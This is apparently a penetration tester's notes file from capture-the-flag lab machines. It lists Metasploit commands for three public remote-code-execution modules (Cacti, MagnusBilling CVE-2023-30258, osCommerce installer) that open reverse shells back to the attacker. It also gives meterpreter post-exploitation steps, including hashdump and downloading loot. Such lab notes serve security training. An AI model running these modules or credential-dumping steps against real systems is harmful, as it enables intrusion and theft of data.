# Metasploit Framework

Exploitation framework used for one public RCE where writing the exploit by hand would be redundant. Also convenient for handling staged payloads and sessions.

## Commands Used

### Cacti graph template RCE
```
msfconsole
use multi/http/cacti_graph_template_rce
set RHOSTS cacti.monitorsfour.htb
set VHOST  cacti.monitorsfour.htb
set TARGET 0          # Linux (container)
set LHOST  tun0
run
sessions -i 1
shell
/bin/bash -i
```
Used on: **MonitorsFour** — lands a shell inside the Cacti Docker container, from which the Docker API escape is performed.

### MagnusBilling unauthenticated RCE (CVE-2023-30258)
```
msfconsole
search magnusbilling
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS $TARGET
set TARGETURI /mbilling/
set LHOST tun0
run
# → meterpreter as user `asterisk`
shell
bash -i
export TERM=xterm-256color
```
Used on: **Billing** — lands an unauthenticated foothold on the Asterisk/MagnusBilling VoIP frontend.

### osCommerce 2.3.4 installer unauth RCE
```
msfconsole
use exploit/multi/http/oscommerce_installer_unauth_code_exec
set RHOSTS $TARGET
set TARGETURI /catalog/
set LHOST tun0
run
```
Used on: **Blueprint** — see [oscommerce-installer-rce.md](../exploits/oscommerce-installer-rce.md).

### Useful post-exploitation helpers
```
# Inside a meterpreter session
getuid
sysinfo
hashdump              # Windows — requires SYSTEM
download <remote>     # Pull loot back to the attacker
upload <local> <remote>

# Session management
background            # Park the session
sessions -l
sessions -i <id>
sessions -K           # Kill all
```
